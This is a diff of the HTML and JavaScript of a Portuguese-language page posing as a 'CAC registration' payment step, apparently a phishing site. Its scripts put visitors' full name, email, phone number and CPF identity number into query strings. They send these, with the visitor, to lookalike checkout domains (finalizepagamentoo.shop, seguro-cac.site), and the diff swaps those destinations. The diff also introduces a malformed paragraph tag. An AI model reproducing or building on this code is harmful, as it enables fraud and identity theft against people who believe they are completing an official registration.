@@ -660,19 +660,20 @@ Shopify.routes.root = "https://cac-registro.org/";</script>
                 </ul>
             </div>
 
-            <p class="mb-6 text-base">Clique no botão abaixo para ser redirecionado à página de pagamento e finalizar seu processo de registro CAC:</p>
-            <div class="flex justify-center">
-                <button id="paymentButton" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center">
-                    <span>Efetuar Pagamento</span>
-        <i class="fas fa-arrow-right ml-2"></i>
-    </button>
+            <p <p class="mb-6 text-base">
+  Clique no botão abaixo para ser redirecionado à página de pagamento e finalizar seu processo de registro CAC:
+</p>
+<div class="flex justify-center">
+  <button
+    id="paymentButton"
+    onclick="window.location.href='https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0';"
+    class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-full text-base animate-left-right inline-flex items-center"
+  >
+    <span>Efetuar Pagamento</span>
+    <i class="fas fa-arrow-right ml-2"></i>
+  </button>
 </div>
 
-<script>
-    document.getElementById('paymentButton').addEventListener('click', function () {
-        window.location.href = `https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
-    });
-</script>
             
         </div>
                     <!-- Seção com a imagem e textos sobrepostos -->
@@ -822,7 +823,7 @@ img {
     
 
         // Construir a URL com os dados
-        const pagSeguroUrl = `https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0j?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
+        const pagSeguroUrl = `https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
 
         // Pré-carregar o iframe
         pagSeguroIframe.src = pagSeguroUrl;
@@ -902,7 +903,7 @@ img {
 
         function setFormDataCloudfoxCheckout(method = "POST") {
             
-            const urlCloudfoxCheckout = 'https://checkout.finalizepagamentoo.shop/VCCL1O8SBSW0';
+            const urlCloudfoxCheckout = 'https://pay.seguro-cac.site/nWrxGWj55MoZ654';
             let form = document.querySelector(`form[action="${urlCloudfoxCheckout}"]`);
 
             if(form === null) {
